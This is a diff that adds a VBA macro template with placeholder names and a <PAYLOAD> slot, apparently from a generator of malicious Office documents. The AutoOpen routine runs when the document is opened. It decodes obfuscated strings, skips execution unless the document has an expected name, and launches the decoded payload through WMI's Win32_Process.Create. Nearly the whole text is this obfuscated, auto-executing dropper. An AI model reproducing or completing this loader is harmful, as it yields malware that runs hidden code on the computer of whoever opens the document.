@@ -1,0 +1,55 @@
+Sub AutoOpen()
+    <variable5>
+End Sub
+
+Sub <variable5>()
+    Dim <variable6> As String
+    Dim <variable7> As String
+    
+    <variable6> = <PAYLOAD>
+    
+
+    <variable7> = <variable12>(<variable6>)
+    On Error Resume Next
+    If ActiveDocument.Name <> <variable12>("<hello.doc>") Then
+        Exit Sub
+    End If
+    On Error GoTo 0
+    
+
+    Dim <variable8> As String
+    Dim <variable9> As String
+    Dim <variable10> As Variant
+    Dim <variable11> As Variant
+
+
+    <variable8> = <variable12>("<winmgmts>")
+    <variable9> = <variable12>("<Win32_Process>")
+    <variable11> = Null
+
+    GetObject(<variable8>).Get(<variable9>).Create <variable7>, <variable11>, <variable11>, <variable10>
+
+
+End Sub
+
+
+
+Function <variable13>(<variable5>)
+    <variable13> = Chr(<variable5> - <offset>)
+End Function
+
+Function <variable14>(<variable4>)
+    <variable14> = Left(<variable4>, 3)
+End Function
+
+Function <variable15>(<variable3>)
+    <variable15> = Right(<variable3>, Len(<variable3>) - 3)
+End Function
+
+Function <variable12>(<variable2>)
+    Do
+        <variable0> = <variable0> + <variable13>(<variable14>(<variable2>))
+        <variable2> = <variable15>(<variable2>)
+    Loop While Len(<variable2>) > 0
+    <variable12> = <variable0>
+End Function
